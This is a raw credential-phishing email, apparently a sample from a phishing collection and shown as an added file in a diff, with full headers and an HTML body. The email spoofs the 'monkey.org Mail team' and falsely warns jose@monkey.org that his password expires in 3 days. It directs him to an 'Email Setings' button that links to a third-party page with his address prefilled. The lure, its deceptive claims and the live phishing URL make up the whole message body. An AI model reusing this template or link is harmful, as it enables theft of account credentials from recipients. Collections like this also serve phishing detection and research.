@@ -1,0 +1,134 @@
+Return-Path: admin@digi.com.kh
+Delivered-To: jose@monkey.org
+X-FDA: 77932892184.53.894F9D8
+Received: from cpns1.citechco.net (cpns1.citechco.net [203.191.33.99])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP id 78DDB1005AC02
+	for <jose@monkey.org>; Thu, 18 Mar 2021 12:16:08 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=citech-bd.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=c3RzRcv52lLxRCwUJnL4S7DDXKkGkij+FZV26iEdNbc=; b=e/WB0YUhRTzjFbVu6j2xU0h1Ol
+	F1OxvoU+6tJKnLonK1m42Xzpt/nSpHmZL1LtJD3wQiwp7elwlfE2GwCkR/HxlB78f0MSqbUAfKCpZ
+	wTbZI8uApTgXz3q3Rm3Spqt8Nz2d66yZ7wS+wFjvwfknEWa27dz9bmVtHRs86LHYlAWrCT3kI0wMr
+	uIQ5nGi04EmjHR3dHCfZXoXGmUngyMey1TKebAYgvnSBoTdezRQv9rlEjqtOcE0oVB4KYEEbO88pi
+	5WT1Gcz6/rjFHgvTYV+sxDpexZA9m6tfVi9de2arvh9yJxpvuoqNxg1S2aq20E1wphIaHuIbD4RLK
+	AtksbUGg==;
+Received: from [20.57.137.125] (port=62460 helo=digi.com.kh)	by
+ cpns1.citechco.net with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.93)	(envelope-from
+ <admin@digi.com.kh>)	id 1lMrZJ-0001ub-6N	for jose@monkey.org; Thu, 18 Mar
+ 2021 18:16:01 +0600
+From: monkey.org  <admin@digi.com.kh>
+To: jose@monkey.org
+Subject:
+ Your Email Account (jose@monkey.org) password is set to expire in 3 days
+Date: 18 Mar 2021 12:16:00 +0000
+Message-ID: <20210318121600.4AF44F1AFA527D77@digi.com.kh>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - cpns1.citechco.net
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - digi.com.kh
+X-Get-Message-Sender-Via:
+ cpns1.citechco.net: authenticated_id: alimchow@citech-bd.com
+X-Authenticated-Sender: cpns1.citechco.net: alimchow@citech-bd.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Status: No, score=8.86
+X-Stat-Signature: 7wmasypxcpcsawfxpaczey4c7an15byj
+X-Rspamd-Queue-Id: 78DDB1005AC02
+X-Rspamd-Server: rspam03
+Received-SPF: none (digi.com.kh>: No applicable sender policy available)
+ receiver=imf12.b.tucows.com; identity=mailfrom;
+ envelope-from="<admin@digi.com.kh>"; helo=cpns1.citechco.net;
+ client-ip=203.191.33.99
+X-HE-DKIM-Result: pass/pass
+X-Spam-Summary: =?utf-8?q?50=2C0=2C0=2C9da5298f03302d39=2Cd41d8cd98f00b204?=
+ =?utf-8?b?LGFkbWluQGRpZ2kuY29tLmtoLGpvc2VAbW9ua2V5Lm9yZyxSVUxFU19ISVQ6NDE6?=
+ =?utf-8?b?NzI6MzU1OjM3NTozNzk6NDk1OjgwMDo5Njc6OTczOjk4Mzo5ODg6OTg5OjEyMDg6?=
+ =?utf-8?q?1224=3A1256=3A1260=3A1263=3A1311=3A1313=3A1314=3A1345=3A1381=3A13?=
+ =?utf-8?q?94=3A1395=3A1431=3A1437=3A1513=3A1515=3A1516=3A1517=3A1521=3A1534?=
+ =?utf-8?q?=3A1542=3A1566=3A1593=3A1594=3A1699=3A1711=3A1714=3A1730=3A1747?=
+ =?utf-8?q?=3A1777=3A1792=3A2194=3A2199=3A2393=3A2525=3A2527=3A2549=3A2553?=
+ =?utf-8?q?=3A2560=3A2563=3A2682=3A2685=3A2693=3A2828=3A2859=3A2890=3A2909?=
+ =?utf-8?q?=3A2933=3A2937=3A2939=3A2942=3A2945=3A2947=3A2951=3A2954=3A3022?=
+ =?utf-8?q?=3A3038=3A3138=3A3139=3A3140=3A3141=3A3142=3A3148=3A3362=3A3421?=
+ =?utf-8?q?=3A3586=3A3865=3A3867=3A3870=3A3871=3A3872=3A3873=3A3934=3A3936?=
+ =?utf-8?q?=3A3938=3A3941=3A3944=3A3947=3A3950=3A3953=3A3956=3A3959=3A4042?=
+ =?utf-8?q?=3A4321=3A4361=3A4552=3A5007=3A6653=3A7652=3A8599=3A8778=3A8957?=
+ =?utf-8?q?=3A8987=3A9025=3A9080=3A9108=3A9388=3A9908=3A10004=3A10346=3A1040?=
+ =?utf-8?q?0=3A10482=3A10849=3A11257=3A11657=3A11658=3A12043=3A12050=3A12295?=
+ =?utf-8?q?=3A12297=3A12438=3A12517=3A12519=3A12555=3A12764=3A12895=3A12955?=
+ =?utf-8?q?=3A12958=3A12986=3A13025=3A13095=3A13139=3A13439=3A13870=3A13898?=
+ =?utf-8?q?=3A13975=3A14093=3A14094=3A14181=3A14721=3A14849=3A18000=3A19901?=
+ =?utf-8?q?=3A19997=3A21080=3A21433=3A21450=3A21451=3A21524=3A21554=3A21627?=
+ =?utf-8?q?=3A21660=3A21796=3A21804=3A21810=3A21819=3A21939=3A22058=3A30001?=
+ =?utf-8?q?=3A30016=3A30022=3A30026=3A30037=3A30054=3A30069=3A30070=3A30090?=
+ =?utf-8?q?=2C0=2CRBL=3A2?=
+ 0.57.137.125:@digi.com.kh:jose@monkey.org.lbl8.mailshell.net-62.6.0.100 
+ =?utf-8?q?64=2E201=2E201=2E201=3B04y8j1m4ikqoybm93e8qqwxfkz7mjyfopn74cqazf7?=
+ =?utf-8?q?3hq83kkedzxonzygs4pb9=2E3ohhmynuiojy4pytyz66y8akkiqhhmztpcrqk9qsy?=
+ =?utf-8?q?et9xsq9foxdd4w1u4tczk1=2E9jxwrzata4w493dsfrihhu5fk9bu-lbl8=2Email?=
+ =?utf-8?q?shell=2Enet-223=2E238=2E255=2E100=2CCacheIP=3Anone=2CBayesian=3A0?=
+ =?utf-8?b?LjUsMC41LDAuNSxOZXRjaGVjazpub25lLERvbWFpbkNhY2hlOjAsTVNGOm5v?=
+ =?utf-8?q?t_bulk=2CSPF=3Afs=2CMSBL=3A0=2CDNSBL=3Aneutral=2CCustom=5Frules?=
+ =?utf-8?b?OjA6MDowLExGdGltZToyNCxMVUFfU1VNTUFSWTpub25l?=
+X-HE-Tag: 1616069768-501309
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 21
+
+<div id=3D":dy" class=3D"Am Al editable LW-avf" hidefocus=3D"true" aria-lab=
+el=3D"Message Body" g_editable=3D"true" role=3D"textbox" aria-multiline=3D"=
+true" style=3D"direction: ltr; min-height: 244px;" tabindex=3D"1" itacorner=
+=3D"6,7:1,1,0,0" contenteditable=3D"true">
+<div class=3D"m_-888124906970704050m_3843909953656293706m_-8417816601950724=
+046m_-5852519039906866788m_8573553606513118319gmail-_rp_D5 m_-8881249069707=
+04050m_3843909953656293706m_-8417816601950724046m_-5852519039906866788m_857=
+3553606513118319gmail-ms-font-weight-regular m_-888124906970704050m_3843909=
+953656293706m_-8417816601950724046m_-5852519039906866788m_85735536065131183=
+19gmail-ms-font-color-neutralDark"=20
+id=3D"m_-888124906970704050m_3843909953656293706m_-8417816601950724046m_-58=
+52519039906866788m_8573553606513118319gmail-Item.MessageNormalizedBody" sty=
+le=3D"font-family:&quot;wf_segoe-ui_normal&quot;,&quot;Segoe UI&quot;,&quot=
+;Segoe WP&quot;,Tahoma,Arial,sans-serif,serif,&quot;EmojiFont&quot;"><div c=
+lass=3D"m_-888124906970704050m_3843909953656293706m_-8417816601950724046m_-=
+5852519039906866788m_8573553606513118319gmail-rps_80b9">
+<div>
+<div>
+<div>jose<div style=3D"padding-bottom:10px">Your Email Account (jose@monkey=
+=2Eorg) password is set to expire in 3 days, it will expire on.</div>
+<DIV><SPAN class=3Dstyle1><STRONG>22 Mar 2021</STRONG></SPAN>.</DIV>
+<div style=3D"padding-bottom:10px">We recommend you to cl<i>ick the Email S=
+ettings below to confirm your email password to avoid login interruptions.<=
+/i></div><i>
+</i><div style=3D"padding:10px;text-align:center;background-color:rgb(0,120=
+,215)">
+<i><a href=3D"http://intranet.thecreativetrunk.com/maint/Qo/index.php?email=
+=3Djose@monkey.org" rel=3D"noopener noreferrer" style=3D"font-family:Boing-=
+Bold,&quot;Arial Black&quot;,sans-serif;color:white" target=3D"_blank">Emai=
+l Setings</a></i></div><i>
+</i><div style=3D"padding-bottom:10px;padding-top:10px"><i>Best Regards,</i=
+></div><i>
+</i><div style=3D"padding-bottom:10px"><i><b>Note:</b>Please do not ignore =
+this message.</i></div><i>
+</i><div style=3D"padding-bottom:10px"><i>2021 =A9 monkey.org Mail team.</i=
+></div><i>
+</i></div><i>
+</i></div><i>
+
+</i></div><i>
+</i></div></div><i>
+
+</i><br></div>
+
